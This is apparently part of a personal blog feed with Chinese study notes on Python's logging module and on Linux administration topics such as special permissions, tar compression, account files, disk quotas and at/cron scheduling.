    <content type="html"><![CDATA[<p>logging 在这里是”日志”的含义。</p><p>日志是用来记录程序运行事件的工具。</p><h1 id="什么时候使用-logging-包"><a href="#什么时候使用-logging-包" class="headerlink" title="什么时候使用 logging 包"></a>什么时候使用 logging 包</h1><p>日志函数的命名依据于<strong>事件级别</strong>:</p><ul><li>DEBUG, 通常用在调试时输出详细信息</li><li>INFO，确认函数在正常运行</li><li>WARNING, 在程序依旧能够正常运行的情况下，记录某个期望外的运行事件或记录一些达到临界值的运行信息</li><li>ERROR, 因为某些严重的运行错误，影响程序的某些功能使用</li><li>CRITICAL, 运行错误存在导致程序不能继续运行的场景<br>默认的事件级别为 WARNING, 只有事件级别高于 WARNING 才会被捕捉。</li></ul><p>可以显示设置日志级别。</p><h1 id="把日志写入文件"><a href="#把日志写入文件" class="headerlink" title="把日志写入文件"></a>把日志写入文件</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span><br>logging.basicConfig(<span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;example.log&#x27;</span>, <span class="hljs-attribute">level</span>=logging.DEBUG) # 指定了文件名以及等级<br>logging.<span class="hljs-built_in">debug</span>(<span class="hljs-string">&#x27;This message should go to the log file&#x27;</span>)<br>logging.<span class="hljs-built_in">info</span>(<span class="hljs-string">&#x27;So should this&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>basicConfig()</code> 函数仅在第一次调用时生效。 </p><p>在命令行配置日志级别:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">--<span class="hljs-built_in">log</span>=<span class="hljs-built_in">INFO</span><br></code></pre></td></tr></table></figure><h1 id="记录变量信息"><a href="#记录变量信息" class="headerlink" title="记录变量信息"></a>记录变量信息</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span><br>logging.<span class="hljs-built_in">warning</span>(<span class="hljs-string">&#x27;%s before you %s&#x27;</span>, <span class="hljs-string">&#x27;Look&#x27;</span>, <span class="hljs-string">&#x27;Leap!&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="自定义日志信息的格式"><a href="#自定义日志信息的格式" class="headerlink" title="自定义日志信息的格式"></a>自定义日志信息的格式</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> logging<br><br>logging.basicConfig(<span class="hljs-keyword">format</span>=<span class="hljs-string">&#x27;%(levelname)s:%(message)s&#x27;</span>, <span class="hljs-keyword">level</span>=logging.<span class="hljs-keyword">DEBUG</span>) # 利用 <span class="hljs-keyword">format</span> 参数<br></code></pre></td></tr></table></figure><h1 id="展示时间信息"><a href="#展示时间信息" class="headerlink" title="展示时间信息"></a>展示时间信息</h1><p>增加 <code>%(asctime)s</code> 来让你的程序输出时间信息。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span><br>logging.basicConfig(<span class="hljs-attribute">format</span>=<span class="hljs-string">&#x27;%(asctime)s %(message)s&#x27;</span>)<br></code></pre></td></tr></table></figure><p>自定义时间格式:</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">logging.basicConfig(format=&#x27;%(asctime)<span class="hljs-keyword">s</span> %(message)<span class="hljs-keyword">s</span>&#x27;, datefmt=&#x27;<span class="hljs-built_in">%m</span>/<span class="hljs-built_in">%d</span>/<span class="hljs-built_in">%Y</span> <span class="hljs-built_in">%I</span>:<span class="hljs-built_in">%M</span>:<span class="hljs-built_in">%S</span> <span class="hljs-built_in">%p</span>&#x27;) # 传入 datefmt 参数<br></code></pre></td></tr></table></figure><h1 id="error-方法"><a href="#error-方法" class="headerlink" title="error 方法"></a>error 方法</h1><p>将 error 方法里的 exc_info 参数设置为 Ture, 可以打印出 Traceback 错误堆栈信息。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>鸟哥的 Linux 私房菜 Notes</title>
    <link href="/2022/08/24/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-Notes/"/>
    <url>/2022/08/24/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第6章-Linux-文件与目录管理"><a href="#第6章-Linux-文件与目录管理" class="headerlink" title="第6章 Linux 文件与目录管理"></a>第6章 Linux 文件与目录管理</h1><h2 id="6-4-文件与目录的默认权限与隐藏权限"><a href="#6-4-文件与目录的默认权限与隐藏权限" class="headerlink" title="6.4 文件与目录的默认权限与隐藏权限"></a>6.4 文件与目录的默认权限与隐藏权限</h2><h3 id="6-4-3-文件特殊权限-SUID-SGID-SBIT"><a href="#6-4-3-文件特殊权限-SUID-SGID-SBIT" class="headerlink" title="6.4.3 文件特殊权限: SUID, SGID, SBIT"></a>6.4.3 文件特殊权限: SUID, SGID, SBIT</h3><h4 id="Set-UID"><a href="#Set-UID" class="headerlink" title="Set UID"></a>Set UID</h4><p>当 s 这个标志出现在文件拥有者的 x 权限上时，此时被称为 Set UID,简称 SUID 的特殊权限.</p><p>SUID 的限制与功能:</p><ul><li>SUID 权限仅对二进制程序有效</li><li>执行者对于该程序要具有 x 的可执行权限 </li><li>本权限仅在执行该程序的过程中有效</li><li>执行者将具有该程序拥有者的权限</li></ul><p>SUID 不能用在 shell 脚本上面，shell 脚本只是将很多的二进制文件调用执行而已.</p><h4 id="Set-GID"><a href="#Set-GID" class="headerlink" title="Set GID"></a>Set GID</h4><p>当 s 在用户组的 x 时则称为 Set GID (SGID), 可用 <code>ls</code> 命令查看:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l <br></code></pre></td></tr></table></figure><p>与 SUID 不同, SGID 可以针对文件或目录来设置。</p><p>如果是对文件，SGID 有如下的功能:</p><ul><li>SGID 对二进制程序有用</li><li>程序执行者对于该程序来说，需具备 x 的权限</li><li>执行者在执行的过程中将会获得该程序用户组的支持</li></ul><p>如果是对目录:</p><ul><li>用户若对于此目录有 r 与 x 的权限时，该用户能够进入此目录</li><li>用户在此目录下的有效用户组 (effective group) 将会变成该目录的用户组</li><li>若用户在此目录下具有 w 的权限，则用户建立的新文件，该新文件的用户组与此目录的用户组相同</li></ul><h4 id="Sticky-Bit"><a href="#Sticky-Bit" class="headerlink" title="Sticky Bit"></a>Sticky Bit</h4><p>目前只针对目录有效:</p><ul><li>当用户对于此目录具有 w, x 权限，即具有写入的权利</li><li>当用户在该目录下建立文件或目录时，仅有自己与 root 才有权限删除该文件</li></ul><h4 id="SUID-x2F-SGID-x2F-SBIT-权限设置"><a href="#SUID-x2F-SGID-x2F-SBIT-权限设置" class="headerlink" title="SUID&#x2F;SGID&#x2F;SBIT 权限设置"></a>SUID&#x2F;SGID&#x2F;SBIT 权限设置</h4><ul><li>4 为 SUID</li><li>2 为 SGID</li><li>1 为 SBIT<br>如: <code>chmod 4755 filename</code>.</li></ul><h1 id="第8章-文件与文件系统的压缩"><a href="#第8章-文件与文件系统的压缩" class="headerlink" title="第8章 文件与文件系统的压缩"></a>第8章 文件与文件系统的压缩</h1><p>在 Linux 下, 扩展名没有什么特殊意义.</p><p>很多 email 都有容量大约 25MB 每封信的限制.</p><h2 id="8-2-Linux-系统常见的压缩指令"><a href="#8-2-Linux-系统常见的压缩指令" class="headerlink" title="8.2 Linux 系统常见的压缩指令"></a>8.2 Linux 系统常见的压缩指令</h2><p><img src="/../img/compress_cmd.png" alt="compress command"></p><p>tar 可以将很多文件 “打包” 成为一个文件.</p><p>单纯的 tat 只是用来打包. 现在的版本有了压缩功能.</p><h3 id="8-2-1-gzip-zcat-x2F-zmore-x2F-zless-x2F-zgrep"><a href="#8-2-1-gzip-zcat-x2F-zmore-x2F-zless-x2F-zgrep" class="headerlink" title="8.2.1 gzip, zcat&#x2F;zmore&#x2F;zless&#x2F;zgrep"></a>8.2.1 gzip, zcat&#x2F;zmore&#x2F;zless&#x2F;zgrep</h3><p>gzip 为了取代 compress.</p><p>压缩:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gzip -v 文件<br></code></pre></td></tr></table></figure><p>解压缩:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gzip -d 文件<br></code></pre></td></tr></table></figure><p>查看压缩文件的原始内容:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zcat 文件名.gz<br></code></pre></td></tr></table></figure><p>还有 <code>zmore</code>, <code>zless</code>, <code>zgrep</code> 等.</p><p><code>-c</code> 选项和重定向搭配:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gzip -c service &gt; service.gz<br></code></pre></td></tr></table></figure><p><code>znew</code> 可以把 compress 命令形成的 <code>.Z</code> 文件转化成 <code>gzip</code> 格式.</p><h3 id="8-2-2-bzip2-bzcat-x2F-bzmore-x2F-bzless-x2F-bzgrep"><a href="#8-2-2-bzip2-bzcat-x2F-bzmore-x2F-bzless-x2F-bzgrep" class="headerlink" title="8.2.2 bzip2, bzcat&#x2F;bzmore&#x2F;bzless&#x2F;bzgrep"></a>8.2.2 bzip2, bzcat&#x2F;bzmore&#x2F;bzless&#x2F;bzgrep</h3><p>bzip2 为了取代 gzip 并提供更佳的压缩比.</p><p>其用法几乎和 gzip 相同.</p><h3 id="8-2-3-xz-xzcat-x2F-xzmore-x2F-xzless-x2F-xzgrep"><a href="#8-2-3-xz-xzcat-x2F-xzmore-x2F-xzless-x2F-xzgrep" class="headerlink" title="8.2.3 xz, xzcat&#x2F;xzmore&#x2F;xzless&#x2F;xzgrep"></a>8.2.3 xz, xzcat&#x2F;xzmore&#x2F;xzless&#x2F;xzgrep</h3><p>压缩比更高.</p><p>其用法和 bzip2&#x2F;xz 一样.</p><h2 id="8-3-打包指令-tar"><a href="#8-3-打包指令-tar" class="headerlink" title="8.3 打包指令: tar"></a>8.3 打包指令: tar</h2><p>将多个文件或目录包成一个大文件的功能, 被称为打包指令.</p><p>tar 并不会主动产生建立的文件名.</p><p><code>-f</code> 后面跟文件名. 一般将 <code>-f</code> 选项从其他选项中独立出来.</p><p>如压缩:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -jcv -f filename.tar.bz2 +要被压缩的文件或目录<br></code></pre></td></tr></table></figure><p>查询:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -jtv -f filename.tar.bz2<br></code></pre></td></tr></table></figure><p>解压:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -jxv -f filename.tar.bz2 -C 想要在哪个目录解压<br></code></pre></td></tr></table></figure><p>有时加上 <code>-p</code> 保留原本文件的权限和属性.</p><p>拿掉根目录的原因是防止覆盖.</p><p>可以只解开 <code>.tar</code> 中的单一文件.</p><p>使用 <code>--exclude=</code> 参数可以不包括某个文件或目录.</p><p>可以仅备份比某个时间更新的文件.</p><h1 id="第13章-Linux-账号管理与-ACL-权限设置"><a href="#第13章-Linux-账号管理与-ACL-权限设置" class="headerlink" title="第13章 Linux 账号管理与 ACL 权限设置"></a>第13章 Linux 账号管理与 ACL 权限设置</h1><h2 id="13-1-Linux-的账号与用户组"><a href="#13-1-Linux-的账号与用户组" class="headerlink" title="13.1 Linux 的账号与用户组"></a>13.1 Linux 的账号与用户组</h2><h3 id="13-1-1-用户标识符-UID-与-GID"><a href="#13-1-1-用户标识符-UID-与-GID" class="headerlink" title="13.1.1 用户标识符: UID 与 GID"></a>13.1.1 用户标识符: UID 与 GID</h3><p>账号的 ID 与 账号的对应在 <code>/etc/passwd</code> 中。</p><p>每个登录的用户至少都会获取两个 ID, 一个是用户 ID (User ID, UID), 一个是用户组 ID (Group ID, GID).</p><h3 id="13-1-2-用户账号"><a href="#13-1-2-用户账号" class="headerlink" title="13.1.2 用户账号"></a>13.1.2 用户账号</h3><p>输入账号和密码后，系统的处理:</p><ol><li>先查找 <code>/etc/passwd</code> 里面是否有你输入的账号，如果有，则将账号对应的 UID 和 GID (在 <code>/etc/group</code> 中) 读出, 并将家目录与 Shell 设置也读出.</li><li>再来核对密码表。这时 Linux 会进入 <code>/etc/shadow</code> 里面找出对应的账号与 UID.</li><li>如果一切正常，则进入 shell 管理阶段。</li></ol><p>对 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 的详细说明可见 <code>man 5 passwd</code> 和 <code>man 5 shadow</code>.</p><h4 id="etc-passwd-文件结构"><a href="#etc-passwd-文件结构" class="headerlink" title="/etc/passwd 文件结构"></a><code>/etc/passwd</code> 文件结构</h4><p>有七部分内容，用 <code>:</code> 隔开:</p><ol><li>账号名称</li><li>密码</li><li>UID</li><li>GID</li><li>用户信息说明栏</li><li>家目录, 当账户登录时就会进入的目录</li><li>shell</li></ol><h4 id="etc-shadow-文件结构"><a href="#etc-shadow-文件结构" class="headerlink" title="/etc/shadow 文件结构"></a><code>/etc/shadow</code> 文件结构</h4><p>同样以 <code>:</code> 分隔，共有九个字段:</p><ol><li>账户名称</li><li>密码</li><li>最近修改密码的日期, 其计算的天数从 1971-1-1 开始</li><li>密码不可被修改的天数</li><li>密码需要重新修改的天数</li><li>密码需要修改期限前的警告天数</li><li>密码过期后的账号宽限时间</li><li>账号失效日期</li><li>保留</li></ol><p>root 密码忘记的解决办法:</p><ul><li>重新启动后进入单人维护模式</li><li>以 Live CD 启动后挂载根目录去修改 <code>/etc/shadow</code></li></ul><p>查看 shadow 是使用哪种加密的机制:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">authconfig --<span class="hljs-built_in">test</span> |grep hasing</span><br></code></pre></td></tr></table></figure><h3 id="13-1-3-关于用户组-有效与初始用户组-groups-newgr"><a href="#13-1-3-关于用户组-有效与初始用户组-groups-newgr" class="headerlink" title="13.1.3 关于用户组: 有效与初始用户组, groups, newgr"></a>13.1.3 关于用户组: 有效与初始用户组, groups, newgr</h3><p>两个文件 <code>/etc/group</code> 和 <code>/etc/gshadow</code>.</p><h4 id="etc-group-文件结构"><a href="#etc-group-文件结构" class="headerlink" title="/etc/group 文件结构"></a><code>/etc/group</code> 文件结构</h4><ol><li>组名</li><li>用户组密码</li><li>GID</li><li>此用户组主持的账号名称</li></ol><h4 id="有效用户组-effective-group-和初始用户组-initial-group"><a href="#有效用户组-effective-group-和初始用户组-initial-group" class="headerlink" title="有效用户组 (effective group) 和初始用户组 (initial group)"></a>有效用户组 (effective group) 和初始用户组 (initial group)</h4><p>初始用户组 (<code>/etc/passwd</code> 中的第4字段) 在用户一登录就会主动获取，不需要在 <code>/etc/group</code> 的第四个字段内写入该账号。</p><p>通常有效用户组的作用就是新建文件, 一个账号新建的文件，其所属用户组为有效用户组.</p><p>通过 <code>groups</code> 命令查看，第一个输出即为有效用户组，后面的为用户所属的其他用户组.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">groups</span></span><br></code></pre></td></tr></table></figure><h4 id="newgrp-有效用户组的切换"><a href="#newgrp-有效用户组的切换" class="headerlink" title="newgrp: 有效用户组的切换"></a>newgrp: 有效用户组的切换</h4><p>你想要切换的用户组必须是你已经有支持的用户组。</p><p>这个命令可以修改目前用户的有效用户组，而且使用另一个 shell 提供此功能。用户的环境设置不会有影响，但是其用户组权限会重新计算。</p><h4 id="etc-gshadow-文件结构"><a href="#etc-gshadow-文件结构" class="headerlink" title="/etc/gshadow 文件结构"></a><code>/etc/gshadow</code> 文件结构</h4><ol><li>组名</li><li>密码栏</li><li>用户组管理员账号</li><li>有加入该用户组支持的所属账号<br>gshadow 的最大功能是建立用户组管理员。</li></ol><h2 id="13-2-账号管理"><a href="#13-2-账号管理" class="headerlink" title="13.2 账号管理"></a>13.2 账号管理</h2><h3 id="13-2-1-新增与删除用户-useradd-相关配置文件，passwd-usermod-userdel"><a href="#13-2-1-新增与删除用户-useradd-相关配置文件，passwd-usermod-userdel" class="headerlink" title="13.2.1 新增与删除用户: useradd, 相关配置文件，passwd, usermod, userdel"></a>13.2.1 新增与删除用户: useradd, 相关配置文件，passwd, usermod, userdel</h3><h4 id="useradd-参考文件"><a href="#useradd-参考文件" class="headerlink" title="useradd 参考文件"></a>useradd 参考文件</h4><p>useradd 的默认值查看:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># useradd -D</span><br></code></pre></td></tr></table></figure><p>其内容位于 <code>/etc/default/useradd</code></p><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># passwd</span><br></code></pre></td></tr></table></figure><p>后面不接账号就是修改自己的密码。</p><p>利用 standard input 建立用户的密码:</p><h4 id="change"><a href="#change" class="headerlink" title="change"></a>change</h4><p>显示纤细的密码参数:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># change -l 账号名</span><br></code></pre></td></tr></table></figure><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>对账号设置进行调整.</p><h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p>删除用户的相关数据。</p><h3 id="13-2-2-用户功能"><a href="#13-2-2-用户功能" class="headerlink" title="13.2.2 用户功能"></a>13.2.2 用户功能</h3><h4 id="chsh"><a href="#chsh" class="headerlink" title="chsh"></a>chsh</h4><p>change shell 的简写。<br>选项及参数:</p><ul><li><code>-l</code>, 列出目前系统上可用的 shell</li><li><code>-s</code>, 设置修改自己的 shell<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;abc543cc&quot;</span> | passwd --stdin vbird2</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="13-4-用户身份切换"><a href="#13-4-用户身份切换" class="headerlink" title="13.4 用户身份切换"></a>13.4 用户身份切换</h2><h3 id="13-4-1-su"><a href="#13-4-1-su" class="headerlink" title="13.4.1 su"></a>13.4.1 su</h3><p>单纯使用 <code>su -</code> 代表使用 <code>login-shell</code> 的变量文件读取方式登录系统, 若使用者名称没有加上去, 则代表切换为 root 的身份.</p><p>若要完整地切换到新用户的环境, 必须要使用 <code>su - username</code> 或 <code>su -l username</code>, 才会连同 PATH, USER, MAIL 等变量都转换成新用户的环境.</p><h3 id="13-4-2-sudo"><a href="#13-4-2-sudo" class="headerlink" title="13.4.2 sudo"></a>13.4.2 sudo</h3><p>仅有 <code>/etc/sudoers</code> 文件下的用户才能使用 <code>sudo</code>.</p><h1 id="第14章-磁盘配额-Quota-与高级文件系统管理"><a href="#第14章-磁盘配额-Quota-与高级文件系统管理" class="headerlink" title="第14章 磁盘配额 (Quota) 与高级文件系统管理"></a>第14章 磁盘配额 (Quota) 与高级文件系统管理</h1><h2 id="14-1-磁盘配额-Quota-的应用与实践"><a href="#14-1-磁盘配额-Quota-的应用与实践" class="headerlink" title="14.1 磁盘配额 (Quota) 的应用与实践"></a>14.1 磁盘配额 (Quota) 的应用与实践</h2><p>Quota 用于限制用户对磁盘的使用容量.</p><h3 id="14-1-1-什么是磁盘配额"><a href="#14-1-1-什么是磁盘配额" class="headerlink" title="14.1.1 什么是磁盘配额"></a>14.1.1 什么是磁盘配额</h3><h4 id="磁盘配额的一般用途"><a href="#磁盘配额的一般用途" class="headerlink" title="磁盘配额的一般用途"></a>磁盘配额的一般用途</h4><ul><li>针对网站服务器</li><li>针对邮件服务器</li><li>针对文件服务器</li><li>限制某一用户组所能使用的最大磁盘配额</li><li>限制某一用户所能使用的最大磁盘配额</li><li>限制某一目录 (directory) 的最大磁盘配额</li></ul><p><code>du</code> 命令会计算目录的磁盘使用率.</p><h4 id="磁盘配额的使用限制"><a href="#磁盘配额的使用限制" class="headerlink" title="磁盘配额的使用限制"></a>磁盘配额的使用限制</h4><ul><li>ext 文件系统仅能针对整个文件系统, xfs 可以使用 project 模式来设计不同目录的磁盘配额</li><li>内核必须支持磁盘配额</li><li>只对一般身份用户有效</li><li>若启用 SELinux, 非所有目录均可设置磁盘配额, 其会加强某些特殊的权限控制，默认情况下仅能针对 &#x2F;home 进行设置</li></ul><p>磁盘配额可以管理 block 和 inode, 限制 inode 的使用量即管理用户可以建立的文件数量.</p><p>hard 和 soft 限制:</p><ul><li>hard, 不能超过</li><li>soft, 有 grace time<br>hard 值一般高于 soft 值。 默认的 soft 值为 7 天.</li></ul><h3 id="14-1-2-一个-xfs-文件系统的磁盘配额实践范例"><a href="#14-1-2-一个-xfs-文件系统的磁盘配额实践范例" class="headerlink" title="14.1.2 一个 xfs 文件系统的磁盘配额实践范例"></a>14.1.2 一个 xfs 文件系统的磁盘配额实践范例</h3><h3 id="14-1-3-实践磁盘配额流程-1-：文件系统的支持与查看"><a href="#14-1-3-实践磁盘配额流程-1-：文件系统的支持与查看" class="headerlink" title="14.1.3 实践磁盘配额流程 -1 ：文件系统的支持与查看"></a>14.1.3 实践磁盘配额流程 -1 ：文件系统的支持与查看</h3><p>不要在根目录下进行磁盘配额设置.</p><h1 id="第15章-计划任务-crontab"><a href="#第15章-计划任务-crontab" class="headerlink" title="第15章 计划任务(crontab)"></a>第15章 计划任务(crontab)</h1><h2 id="15-1-什么是计划任务"><a href="#15-1-什么是计划任务" class="headerlink" title="15.1 什么是计划任务"></a>15.1 什么是计划任务</h2><h3 id="15-1-1-Linux-计划任务的种类-at-cron"><a href="#15-1-1-Linux-计划任务的种类-at-cron" class="headerlink" title="15.1.1 Linux 计划任务的种类: at, cron"></a>15.1.1 Linux 计划任务的种类: at, cron</h3><ul><li>at, 处理仅执行一次就结束的任务，即突发性任务, 需 atd 服务</li><li>cron, 所设置的任务会循环的执行，即例行任务，每隔一段时间就执行，需 crond 服务</li></ul><h2 id="15-2-仅执行一次的计划任务"><a href="#15-2-仅执行一次的计划任务" class="headerlink" title="15.2 仅执行一次的计划任务"></a>15.2 仅执行一次的计划任务</h2><h3 id="15-2-1-atd-的启动和-at-的运行方式"><a href="#15-2-1-atd-的启动和-at-的运行方式" class="headerlink" title="15.2.1 atd 的启动和 at 的运行方式"></a>15.2.1 atd 的启动和 at 的运行方式</h3><p>在 Ubuntu 下安装 atd 服务:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span><span class="hljs-built_in">at</span><br></code></pre></td></tr></table></figure><p>手动启动:</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo <span class="hljs-params">system</span>ctl restart atd<br>sudo <span class="hljs-params">system</span>ctl enable atd<br>sudo <span class="hljs-params">system</span>ctl status atd<br></code></pre></td></tr></table></figure><h4 id="at-的运行方式"><a href="#at-的运行方式" class="headerlink" title="at 的运行方式"></a>at 的运行方式</h4><p>使用 <code>at</code> 命令来产生所要运行的任务，并以文本文件的方式写入 <code>/var/spool/at</code> 目录内等待 atd 服务的执行。</p><p>可以利用 <code>/etc/at.allow</code> 和 <code>/etc/at.deny</code> 两个文件实现对 at 的限制。</p><p>添加后的工作情况为:</p><ol><li>先找寻 <code>/etc/at.allow</code> 文件，写在这个文件的用户才能使用 at</li><li>如果 <code>/etc/at.allow</code> 文件不存在，则找寻 <code>/etc/at.deny</code> 文件，写在 <code>/etc/at.deny</code> 中的用户不能使用 at</li><li>如果两个文件都不存在，那么只有 root 用户可以使用 at 命令</li></ol><p>不希望某些用户使用 at，就将那个用户的账号写入 <code>/etc/at.deny</code>, 一个账号写一行。</p><h3 id="15-2-2-实际运行单一计划任务"><a href="#15-2-2-实际运行单一计划任务" class="headerlink" title="15.2.2 实际运行单一计划任务"></a>15.2.2 实际运行单一计划任务</h3><p>使用:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">at <span class="hljs-selector-attr">[-mldv]</span> <span class="hljs-selector-tag">TIME</span><br></code></pre></td></tr></table></figure><p>at 命令的选项和参数:</p><ul><li>-m : 应该是 mail, 当 at 的任务完成后，即便没有输出信息，也会发送 email 通知</li><li>-l : 应该是 list, <code>at -l</code> 相当于 <code>atq</code>, 列出目前系统上所有该使用者的 at 计划</li><li>-d : 应该是 delete, <code>at -d</code> 相当于 <code>atrm</code>, 可以取消一个在 <code>at</code> 计划中的任务</li><li>-c : 应该是 code, 可以列出后面接的该项任务的实际命令内容</li></ul><p>最重要的是 <code>TIME</code> 参数, 其格式为:</p><ul><li>HH:MM</li><li>HH:MM YYYY-MM-DD</li><li>HH:MM[am|pm] [Mouth] [Date]</li><li>HH:MM[am|pm] + number [minutes|hours|days|weeks]<br>可以有 <code>now + ...</code> 方式。</li></ul><p>使用 at 时会进入 at shell 的环境执行命令，所以命令最好用绝对路径。</p><p>at 的执行和终端环境无关，如果要显示 Hello:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;Hello&quot;</span> &gt; <span class="hljs-regexp">/dev/</span>tty1<br></code></pre></td></tr></table></figure><p>即通过终端设备处理.</p><p>由于 at 计划任务的使用，系统会将该项 at 任务独立出你的 bash 环境，直接交给系统的 atd 程序来接管。</p><h4 id="at-任务的管理"><a href="#at-任务的管理" class="headerlink" title="at 任务的管理"></a>at 任务的管理</h4><p>使用 <code>atq</code> 查询，<code>atrm</code> 删除。</p><h4 id="batch-系统有空时才执行后台任务"><a href="#batch-系统有空时才执行后台任务" class="headerlink" title="batch: 系统有空时才执行后台任务"></a>batch: 系统有空时才执行后台任务</h4><p>batch 命令也是调用 at 来执行。</p><p>它是在 CPU 任务负载小于 0.8 时才执行你的任务。</p><p>任务负载，即 CPU 在单一时间点所负责的任务数量, 而不是 CPU 的使用率。</p><p>CPU 的任务负载大，代表 CPU 必须要在不同的任务之间执行频繁的任务切换。</p><p>不论是 crontab 还是 at, 其最小单位都是分钟，即它们的任务都是”每分钟检查一次”来处理。</p><h2 id="15-3-循环执行的计划任务"><a href="#15-3-循环执行的计划任务" class="headerlink" title="15.3 循环执行的计划任务"></a>15.3 循环执行的计划任务</h2><h3 id="15-3-1-用户的设置"><a href="#15-3-1-用户的设置" class="headerlink" title="15.3.1 用户的设置"></a>15.3.1 用户的设置</h3><p>建立循环任务需使用 <code>crontab</code> 这个命令。</p><p>配置文件有:</p><ul><li><code>/etc/cron.allow</code></li><li><code>/etc/cron.deny</code><br>前者的优先级同样高于后者。</li></ul><p>使用 <code>crontab</code> 建立计划任务之后，该项任务会被记录到 <code>/var/spool/cron/dmtsai</code> 中。<code>cron</code> 每执行一项任务都会被记录到 <code>/var/log/cron</code> 这个日志文件中。</p><p>语法:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">crontab [-u username] [-l|<span class="hljs-type">-e</span>|<span class="hljs-type">-r</span>]<br></code></pre></td></tr></table></figure><p>选项和参数:</p><ul><li>-u : 只有 root 才能执行这个任务，或者帮其他使用者建立&#x2F;删除 crontab 任务</li><li>-e : edit, 编辑 crontab 任务内容</li><li>-l : list, 查看 crontab 任务内容</li><li>-r : remove, 删除所有的 crontab 任务内容，若仅删除一项，使用 <code>-e</code> 选项<br>每项任务(即每行)都有六个字段:</li><li>分钟, 0~59</li><li>小时, 0~23</li><li>日期, 1~31</li><li>月份, 1~12</li><li>周, 0~7</li><li>命令<br>几个特殊字符:</li><li><code>*</code>, 任何时候</li><li><code>,</code>, 分隔时段</li><li><code>-</code>, 一段时间</li><li><code>/n</code>, 每隔 n 个单位</li></ul><h3 id="15-3-2-系统的配置文件"><a href="#15-3-2-系统的配置文件" class="headerlink" title="15.3.2 系统的配置文件"></a>15.3.2 系统的配置文件</h3><p><code>crontab -e</code> 